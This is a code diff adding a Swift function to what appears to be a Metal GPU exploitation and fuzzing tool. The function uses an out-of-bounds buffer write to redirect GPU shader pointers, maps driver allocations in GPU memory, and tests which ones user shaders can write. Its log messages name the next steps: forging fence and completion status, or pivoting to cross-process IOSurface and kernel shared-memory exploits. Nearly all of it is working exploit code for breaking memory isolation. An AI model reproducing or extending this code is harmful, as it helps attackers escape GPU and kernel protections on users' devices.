@@ -3740,6 +3740,186 @@ func runHit2Write(log: FuzzLog, completion: @escaping () -> Void) {
     }
 }
 
+// ── runDenseMapAndWrite ───────────────────────────────────────────────────────
+// Dense 4KB scan of 0x1500000000 → +2MB to map every driver allocation in the
+// first 2MB above spray base, then test writability of each non-zero hit.
+//
+// Goal: find GPU VAs that are:
+//   1. Non-zero (some driver allocation)
+//   2. WRITABLE from user shader context
+//
+// The only driver allocations that MUST be GPU-writable are ring buffers
+// the GPU itself writes completion status/timestamps to (command buffer rings,
+// fence buffers, timestamp buffers). Finding these gives us writable driver
+// memory → can forge completion status → confuse Metal scheduler.
+//
+// Also covers: are there ANY non-user-buffer writable pages in our GPU VA space?
+// ─────────────────────────────────────────────────────────────────────────────
+func runDenseMapAndWrite(log: FuzzLog, completion: @escaping () -> Void) {
+    DispatchQueue.global(qos: .userInitiated).async {
+        func step(_ s: String) { log.append(s) }
+        step("── Dense Map + Writability Probe ──")
+        guard let device = MTLCreateSystemDefaultDevice() else { step("✗ no device"); completion(); return }
+        let BUF_LEN  = 4096
+        let NTHREADS = 64
+
+        // Spray → lo/hi pair
+        var loRef: MTLBuffer?
+        var nextGPUVA: UInt64 = 0
+        var keepAlives: [any MTLBuffer] = []
+        for _ in 0..<2048 {
+            guard let a = device.makeBuffer(length: BUF_LEN, options: .storageModeShared) else { continue }
+            if let prev = keepAlives.last, a.gpuAddress == prev.gpuAddress + UInt64(BUF_LEN) {
+                loRef = prev; nextGPUVA = a.gpuAddress; break
+            }
+            keepAlives.append(a)
+        }
+        guard let lo = loRef else { step("✗ spray miss"); completion(); return }
+        step("✓ lo=0x\(String(lo.gpuAddress, radix: 16))")
+        let loPtr = lo.contents().assumingMemoryBound(to: UInt8.self)
+
+        guard let hi      = device.makeBuffer(length: BUF_LEN, options: .storageModeShared),
+              let outRead  = device.makeBuffer(length: NTHREADS * 8, options: .storageModeShared),
+              let srcBuf   = device.makeBuffer(length: 8,           options: .storageModeShared) else {
+            step("✗ hi/out/src alloc"); completion(); return
+        }
+        step("hi=0x\(String(hi.gpuAddress, radix: 16)) \(hi.gpuAddress == nextGPUVA ? "✓" : "⚠")")
+
+        func oobWriteVA(_ idx: Int, _ va: UInt64) {
+            let off = idx * 8
+            for bi in 0..<8 { loPtr[BUF_LEN+off+bi] = UInt8((va >> (bi*8)) & 0xFF) }
+        }
+
+        // Read kernel: multiScan (64 threads)
+        let rSrc = """
+        #include <metal_stdlib>
+        using namespace metal;
+        struct Probe { device ulong* buf; };
+        kernel void multiScan(device Probe* p [[buffer(0)]], device ulong* out [[buffer(1)]],
+                              uint tid [[thread_position_in_grid]]) { out[tid] = p[tid].buf[0]; }
+        """
+        // Write kernel: single thread writes to p[0].buf
+        let wSrc = """
+        #include <metal_stdlib>
+        using namespace metal;
+        struct Probe { device ulong* buf; };
+        kernel void gpuWrite(device Probe* p [[buffer(0)]], device ulong* src [[buffer(1)]]) {
+            p[0].buf[0] = src[0];
+        }
+        """
+        guard let rLib = try? device.makeLibrary(source: rSrc, options: nil),
+              let rFn  = rLib.makeFunction(name: "multiScan"),
+              let rPso = try? device.makeComputePipelineState(function: rFn),
+              let wLib = try? device.makeLibrary(source: wSrc, options: nil),
+              let wFn  = wLib.makeFunction(name: "gpuWrite"),
+              let wPso = try? device.makeComputePipelineState(function: wFn) else {
+            step("✗ PSO build failed"); completion(); return
+        }
+        step("✓ multiScan + gpuWrite PSOs ready")
+
+        let CANARY: UInt64 = 0xC0FFEE_DEADC0DE
+        let scanBase = lo.gpuAddress  // 0x1500000000
+        let scanSize: UInt64 = 0x200000  // 2MB above spray base
+
+        // ── Phase 1: dense 4KB read scan ─────────────────────────────────────
+        step("── phase 1: dense 4KB scan 0x\(String(scanBase,radix:16))..+2MB ──")
+        var readHits: [(va: UInt64, val: UInt64)] = []
+
+        let dispatches = Int(scanSize / (UInt64(NTHREADS) * 0x1000))  // = 8
+        for d in 0..<dispatches {
+            let base = scanBase + UInt64(d) * UInt64(NTHREADS) * 0x1000
+            for t in 0..<NTHREADS { oobWriteVA(t, base + UInt64(t) * 0x1000) }
+            outRead.contents().initializeMemory(as: UInt64.self, repeating: 0, count: NTHREADS)
+            guard let q   = device.makeCommandQueue(),
+                  let cb  = q.makeCommandBuffer(),
+                  let enc = cb.makeComputeCommandEncoder() else { continue }
+            enc.setComputePipelineState(rPso)
+            enc.setBuffer(hi,     offset: 0, index: 0)
+            enc.setBuffer(outRead,offset: 0, index: 1)
+            let sz = MTLSize(width: NTHREADS, height: 1, depth: 1)
+            enc.dispatchThreads(sz, threadsPerThreadgroup: sz)
+            enc.endEncoding(); cb.commit(); cb.waitUntilCompleted()
+            if cb.error != nil { continue }
+            let outPtr = outRead.contents().assumingMemoryBound(to: UInt64.self)
+            for t in 0..<NTHREADS {
+                let val = outPtr[t]; if val == 0 { continue }
+                let va = base + UInt64(t) * 0x1000
+                // Skip our own known spray buffers (their content is 0 anyway, but exclude hi itself)
+                if va == hi.gpuAddress || keepAlives.contains(where: { $0.gpuAddress == va }) { continue }
+                readHits.append((va, val))
+                step("  read VA=0x\(String(va,radix:16)) val=0x\(String(val,radix:16))")
+            }
+        }
+        step("  dense scan: \(readHits.count) non-zero non-user VAs in first 2MB")
+
+        // ── Phase 2: writability test for each read hit ───────────────────────
+        step("── phase 2: writability probe for each hit ──")
+        var writableVAs: [(va: UInt64, origVal: UInt64)] = []
+
+        for hit in readHits {
+            // Write canary
+            oobWriteVA(0, hit.va)
+            srcBuf.contents().assumingMemoryBound(to: UInt64.self)[0] = CANARY
+            if let q = device.makeCommandQueue(), let cb = q.makeCommandBuffer(),
+               let enc = cb.makeComputeCommandEncoder() {
+                enc.setComputePipelineState(wPso)
+                enc.setBuffer(hi,    offset: 0, index: 0)
+                enc.setBuffer(srcBuf,offset: 0, index: 1)
+                let sz = MTLSize(width: 1, height: 1, depth: 1)
+                enc.dispatchThreads(sz, threadsPerThreadgroup: sz)
+                enc.endEncoding(); cb.commit(); cb.waitUntilCompleted()
+            }
+            // Read back
+            var readback: UInt64 = 0
+            oobWriteVA(0, hit.va)
+            outRead.contents().assumingMemoryBound(to: UInt64.self)[0] = 0xEEEE
+            if let q = device.makeCommandQueue(), let cb = q.makeCommandBuffer(),
+               let enc = cb.makeComputeCommandEncoder() {
+                enc.setComputePipelineState(rPso)
+                enc.setBuffer(hi,     offset: 0, index: 0)
+                enc.setBuffer(outRead,offset: 0, index: 1)
+                let sz = MTLSize(width: 1, height: 1, depth: 1)
+                enc.dispatchThreads(sz, threadsPerThreadgroup: sz)
+                enc.endEncoding(); cb.commit(); cb.waitUntilCompleted()
+                readback = outRead.contents().assumingMemoryBound(to: UInt64.self)[0]
+            }
+            if readback == CANARY {
+                step("  ★ WRITABLE VA=0x\(String(hit.va,radix:16)) orig=0x\(String(hit.origVal,radix:16))")
+                writableVAs.append((hit.va, hit.origVal))
+                // Restore original value
+                oobWriteVA(0, hit.va)
+                srcBuf.contents().assumingMemoryBound(to: UInt64.self)[0] = hit.origVal
+                if let q = device.makeCommandQueue(), let cb = q.makeCommandBuffer(),
+                   let enc = cb.makeComputeCommandEncoder() {
+                    enc.setComputePipelineState(wPso)
+                    enc.setBuffer(hi,    offset: 0, index: 0)
+                    enc.setBuffer(srcBuf,offset: 0, index: 1)
+                    let sz = MTLSize(width: 1, height: 1, depth: 1)
+                    enc.dispatchThreads(sz, threadsPerThreadgroup: sz)
+                    enc.endEncoding(); cb.commit(); cb.waitUntilCompleted()
+                }
+            } else {
+                step("  read-only VA=0x\(String(hit.va,radix:16)) readback=0x\(String(readback,radix:16))")
+            }
+        }
+
+        step("── summary ──")
+        step("  readable non-user VAs: \(readHits.count)")
+        step("  writable non-user VAs: \(writableVAs.count)")
+        if writableVAs.isEmpty {
+            step("  all driver allocations in this 2MB range are read-only for user shader")
+            step("  IOMMU enforces separation: user shaders write only to user-mapped memory")
+            step("  PIVOT: GPU write → IOSurface backing (writable) → cross-process IOSurface exploit")
+            step("  OR: find mach_port / IOKit shared memory (mapped writable for both user and kernel)")
+        } else {
+            step("  ★ writable driver VAs found — command buffer ring / fence buffer / timestamp buffer")
+            step("  next: forge completion status / timestamps in those writable regions")
+        }
+        step("── Dense Map + Writability Probe complete ──")
+        completion()
+    }
+}
+
 // ── runGPUVAScan ──────────────────────────────────────────────────────────────
 // Sweep GPU VA space with the read redirect primitive to locate Metal driver /
 // kernel-mapped regions not visible from userspace.
